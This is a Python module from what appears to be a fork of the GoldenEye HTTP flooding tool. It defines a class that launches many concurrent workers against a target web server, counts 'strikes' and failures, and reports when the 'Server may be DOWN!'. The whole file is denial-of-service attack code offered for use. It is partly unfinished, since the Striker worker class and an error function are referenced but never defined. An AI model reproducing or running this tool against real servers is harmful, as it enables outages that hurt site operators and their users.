"""

"""
import sys, random, getopt, ssl

from http import client as http_client
from multiprocessing import Process, Manager
from urllib import parse

from .settings import DEFAULT_WORKERS, DEFAULT_SOCKETS, METHOD_GET, PLATINUM_EYE_BANNER, DEBUG, JOIN_TIMEOUT


class GoldenEye:
    # Counters
    counter = [0, 0]
    last_counter = [0, 0]

    # Containers
    workersQueue = []
    manager = None
    useragents = []

    # Properties
    url = None

    # Options
    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_GET

    def __init__(self, url):

        # Set URL
        self.url = url

        # Initialize Manager
        self.manager = Manager()

        # Initialize Counters
        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print("Shutting down GoldenEye")

    def __del__(self):
        self.exit()

    def print_banner(self):
        # TODO replace this shit code
        # Taunt!
        print()
        print(PLATINUM_EYE_BANNER)
        print()

    # Do the fun!
    def fire(self):

        self.print_banner()
        print(
        "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(
            self.method, self.nr_workers, self.nr_sockets))

        if DEBUG:
            print("Starting {0} concurrent workers".format(self.nr_workers))

        # Start workers
        for i in range(int(self.nr_workers)):

            try:
                # TODO need Striker class
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                error("Failed to start worker {0}".format(i))
                pass

        if DEBUG:
            print("Initiating monitor")
        self.monitor()

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print("{0} GoldenEye strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1]))
                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print("\tServer may be DOWN!")
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except Exception:
            # TODO replace Exception with more concrete class
            pass  # silently ignore

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)
                self.stats()
            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print("Killing worker {0}".format(worker.name))
                        # worker.terminate()
                        worker.stop()
                    except Exception as e:
                        pass  # silently ignore
                if DEBUG:
                    raise
                else:
                    pass
